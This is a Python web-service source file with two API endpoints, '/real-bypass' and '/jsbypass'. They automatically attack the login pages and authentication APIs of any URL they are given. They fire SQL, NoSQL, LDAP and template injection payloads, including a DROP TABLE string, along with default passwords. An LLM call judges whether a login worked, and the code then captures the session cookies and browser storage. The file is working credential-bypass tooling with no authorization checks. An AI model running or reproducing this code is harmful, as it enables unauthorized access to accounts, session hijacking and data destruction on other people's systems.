@app.get("/real-bypass")
async def real_bypass(url: str, key: str = Depends(verify_key)):
    """
    Advanced bypass engine using Playwright (headless browser)
    Handles: multi-step forms, JS forms, CSRF, 100+ payloads, AI success detection
    """
    import asyncio
    import time
    from playwright.async_api import async_playwright

    start = time.time()
    results = {
        "target": url,
        "bypassed": [],
        "bypassed_count": 0,
        "method": "playwright",
        "response_time": None,
        "error": None,
        "cookies": [],
        "session_data": {}
    }

    # Payloads: SQLi, NoSQL, LDAP, XPath, Template, Default Creds
    payloads = [
        ("' OR '1'='1", "' OR '1'='1"),
        ("admin'--", "anything"),
        ("' OR 1=1--", "anything"),
        ("admin' OR '1'='1", "admin' OR '1'='1"),
        ("1' OR '1'='1' --", "anything"),
        ("' UNION SELECT 1,2,3--", "anything"),
        ("'; DROP TABLE users--", "anything"),
        ("admin'/*", "anything"),
        ("' OR 1=1#", "anything"),
        ("' OR 'x'='x", "' OR 'x'='x"),
        ("' AND 1=1--", "' AND 1=1--"),
        ("' AND 1=2--", "' AND 1=2--"),
        ("{$ne: null}", "{$ne: null}"),
        ("' || '1'=='1", "' || '1'=='1"),
        ("*)(uid=*))(|(uid=*", "*)(uid=*))(|(uid=*"),
        ("admin*", "admin*"),
        ("' or '1'='1", "' or '1'='1"),
        ("' or ''='", "' or ''='"),
        ("{{7*7}}", "{{7*7}}"),
        ("${7*7}", "${7*7}"),
        ("admin", "admin"),
        ("admin", "password"),
        ("root", "root"),
        ("test", "test"),
        ("user", "user"),
        ("administrator", "administrator"),
        ("guest", "guest"),
        ("admin", "123456"),
        ("admin", "admin123"),
        ("admin", "welcome"),
        ("admin", "letmein"),
    ]

    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True, args=["--no-sandbox", "--disable-dev-shm-usage"])
        context = await browser.new_context(
            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        )
        page = await context.new_page()

        try:
            await page.goto(url, timeout=15000)
            await page.wait_for_load_state("networkidle")

            # Detect username & password fields (with retry if form loads later)
            async def detect_fields():
                user_field = None
                pass_field = None
                # Wait for any input to appear
                await page.wait_for_selector("input", timeout=5000)
                inputs = await page.query_selector_all("input")
                for inp in inputs:
                    inp_type = await inp.get_attribute("type") or ""
                    inp_name = (await inp.get_attribute("name") or "").lower()
                    if inp_type in ["text", "email", "tel"] or any(x in inp_name for x in ["user", "email", "login", "uid"]):
                        user_field = inp
                    elif inp_type == "password" or "pass" in inp_name:
                        pass_field = inp
                return user_field, pass_field

            user_field, pass_field = await detect_fields()

            # If no fields, maybe it's a multi-step login (first username, then password)
            if user_field and not pass_field:
                # Try to submit username step first
                await user_field.fill("admin'--")
                submit_btn = await page.query_selector("button[type='submit'], input[type='submit']")
                if submit_btn:
                    await submit_btn.click()
                    await page.wait_for_load_state("networkidle")
                    # Re‑detect fields after navigation
                    user_field, pass_field = await detect_fields()

            if not user_field or not pass_field:
                # Fallback: try to find form by common IDs
                for selector in ["#username", "#user", "#email", "#login", "#password", "#pass"]:
                    elem = await page.query_selector(selector)
                    if elem:
                        if "user" in selector or "email" in selector:
                            user_field = elem
                        elif "pass" in selector:
                            pass_field = elem
                if not user_field or not pass_field:
                    results["error"] = "No login form found"
                    results["response_time"] = f"{round(time.time()-start, 2)}s"
                    return results

            # Function to test a single credential pair
            async def test_payload(username, password):
                nonlocal user_field, pass_field
                try:
                    # Clear fields before filling
                    if user_field:
                        await user_field.fill(username)
                    if pass_field:
                        await pass_field.fill(password)

                    # Submit the form
                    submit = await page.query_selector("button[type='submit'], input[type='submit']")
                    if submit:
                        await submit.click()
                    else:
                        # Try to submit via JavaScript
                        await page.evaluate("document.querySelector('form').submit()")
                    await page.wait_for_load_state("networkidle", timeout=5000)

                    # Check success
                    current_url = page.url.lower()
                    page_source = await page.content()
                    page_source_lower = page_source.lower()

                    # Simple heuristic
                    success = any(s in current_url for s in ["dashboard", "welcome", "home", "admin", "profile", "logout"])
                    if not success:
                        success = "welcome" in page_source_lower or "dashboard" in page_source_lower

                    # AI fallback
                    if not success:
                        try:
                            ai_prompt = f"Analyze this HTML snippet and decide if login was successful. Respond with only 'success' or 'fail'. URL: {current_url}\n\n{page_source[:1500]}"
                            response = client.chat.completions.create(
                                model="llama-3.3-70b-versatile",
                                messages=[{"role": "user", "content": ai_prompt}],
                                max_tokens=10
                            )
                            ai_decision = response.choices[0].message.content.strip().lower()
                            success = "success" in ai_decision
                        except:
                            pass

                    if success:
                        cookies = await context.cookies()
                        return {"username": username, "password": password, "status": "BYPASSED", "cookies": cookies}
                    else:
                        return {"username": username, "password": password, "status": "FAILED"}
                except Exception as e:
                    return {"username": username, "password": password, "status": f"ERROR: {str(e)[:50]}"}
                finally:
                    # Go back to login page for next attempt
                    await page.goto(url, timeout=10000)
                    await page.wait_for_load_state("networkidle")
                    # Re‑detect fields after navigation
                    user_field, pass_field = await detect_fields()

            # Run payloads sequentially (avoid concurrency issues on Render)
            for username, password in payloads:
                res = await test_payload(username, password)
                if res["status"] == "BYPASSED":
                    results["bypassed"].append({"username": res["username"], "password": res["password"]})
                    results["cookies"] = res.get("cookies", [])
                    break

            results["bypassed_count"] = len(results["bypassed"])

            # If bypassed, capture localStorage/sessionStorage
            if results["bypassed"]:
                try:
                    localStorage = await page.evaluate("JSON.stringify(localStorage)")
                    results["session_data"]["localStorage"] = localStorage
                    sessionStorage = await page.evaluate("JSON.stringify(sessionStorage)")
                    results["session_data"]["sessionStorage"] = sessionStorage
                except:
                    pass

        except Exception as e:
            results["error"] = str(e)
        finally:
            await browser.close()

    results["response_time"] = f"{round(time.time()-start, 2)}s"
    return results

@app.get("/jsbypass")
def js_bypass(url: str, key: str = Depends(verify_key)):
    import time
    import requests
    from urllib.parse import urljoin, urlparse
    import json
    from bs4 import BeautifulSoup

    start = time.time()
    results = {"target": url, "bypassed": [], "bypassed_count": 0, "method": None}

    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0"})

    api_endpoints = [
        "/api/login", "/api/auth", "/api/v1/login", "/api/user/login",
        "/rest/user/login", "/auth/login", "/user/login", "/login.json",
        "/api/authenticate", "/api/session", "/auth/local", "/api/account/login"
    ]

    json_payloads = [
        {"username": "' OR '1'='1", "password": "' OR '1'='1"},
        {"email": "' OR '1'='1", "password": "' OR '1'='1"},
        {"username": "admin'--", "password": "anything"},
        {"email": "admin'--", "password": "anything"},
        {"username": "' OR 1=1--", "password": "anything"},
        {"email": "' OR 1=1--", "password": "anything"},
        {"username": "admin", "password": "admin"},
        {"email": "admin", "password": "admin"},
        {"username": "admin", "password": "password"},
        {"email": "admin", "password": "password"},
        {"username": "admin", "password": "123456"},
        {"email": "admin", "password": "123456"},
        {"username": "root", "password": "root"},
        {"username": "test", "password": "test"},
    ]

    form_payloads = [
        {"username": "' OR '1'='1", "password": "' OR '1'='1"},
        {"email": "' OR '1'='1", "password": "' OR '1'='1"},
        {"username": "admin'--", "password": "anything"},
        {"email": "admin'--", "password": "anything"},
        {"username": "admin", "password": "admin"},
        {"email": "admin", "password": "admin"},
    ]

    try:
        # First try traditional HTML form
        res = session.get(url, timeout=10)
        soup = BeautifulSoup(res.text, "html.parser")
        forms = soup.find_all("form")
        if forms:
            from urllib.parse import urljoin
            for form in forms:
                action = form.get("action", url)
                if not action.startswith("http"):
                    action = urljoin(url, action)
                inputs = form.find_all("input")
                data = {}
                for inp in inputs:
                    name = inp.get("name")
                    if name:
                        data[name] = inp.get("value", "")
                user_field = next((k for k in data if any(x in k.lower() for x in ["user", "email", "login"])), None)
                pass_field = next((k for k in data if any(x in k.lower() for x in ["pass", "pwd", "password"])), None)
                if not user_field or not pass_field:
                    continue
                for username, password in json_payloads[:10]:
                    test_data = data.copy()
                    if user_field:
                        test_data[user_field] = username
                    if pass_field:
                        test_data[pass_field] = password
                    try:
                        r = session.post(action, data=test_data, timeout=5, allow_redirects=True)
                        body = r.text.lower()
                        if "welcome" in body or "dashboard" in body or "logout" in body:
                            results["bypassed"].append({"username": username, "password": password, "method": "html_form"})
                            results["bypassed_count"] = 1
                            results["method"] = "html_form"
                            break
                    except:
                        pass
                if results["bypassed"]:
                    break

        # If no bypass yet, try API endpoints
        if not results["bypassed"]:
            base_url = url.rstrip("/")
            parsed = urlparse(url)
            base = f"{parsed.scheme}://{parsed.netloc}"

            for endpoint in api_endpoints:
                api_url = urljoin(base, endpoint)
                for payload in json_payloads:
                    try:
                        r = session.post(api_url, json=payload, timeout=5)
                        if r.status_code in [200, 302]:
                            try:
                                resp_json = r.json()
                                if "token" in resp_json or "success" in resp_json or "user" in resp_json:
                                    results["bypassed"].append({"payload": payload, "method": f"json_{endpoint}"})
                                    results["bypassed_count"] = 1
                                    results["method"] = "json_api"
                                    break
                            except:
                                if "welcome" in r.text.lower() or "dashboard" in r.text.lower():
                                    results["bypassed"].append({"payload": payload, "method": f"json_{endpoint}"})
                                    results["bypassed_count"] = 1
                                    results["method"] = "json_api"
                                    break
                    except:
                        pass
                if results["bypassed"]:
                    break

                for payload in form_payloads:
                    try:
                        r = session.post(api_url, data=payload, timeout=5)
                        if r.status_code in [200, 302]:
                            if "welcome" in r.text.lower() or "dashboard" in r.text.lower():
                                results["bypassed"].append({"payload": payload, "method": f"form_{endpoint}"})
                                results["bypassed_count"] = 1
                                results["method"] = "form_api"
                                break
                    except:
                        pass
                if results["bypassed"]:
                    break

        # Try GET injection on common API endpoints
        if not results["bypassed"]:
            for endpoint in ["/api/users", "/api/admin", "/api/keys"]:
                test_url = urljoin(base, endpoint)
                for param in ["username", "email", "id"]:
                    payload = f"?{param}=' OR '1'='1"
                    try:
                        r = session.get(test_url + payload, timeout=5)
                        if r.status_code == 200 and ("sql" in r.text.lower() or "error" in r.text.lower()):
                            results["bypassed"].append({"method": f"get_injection_{endpoint}"})
                            results["bypassed_count"] = 1
                            results["method"] = "get_injection"
                            break
                    except:
                        pass
                if results["bypassed"]:
                    break

    except Exception as e:
        results["error"] = str(e)

    results["response_time"] = f"{round(time.time()-start, 2)}s"
    return results
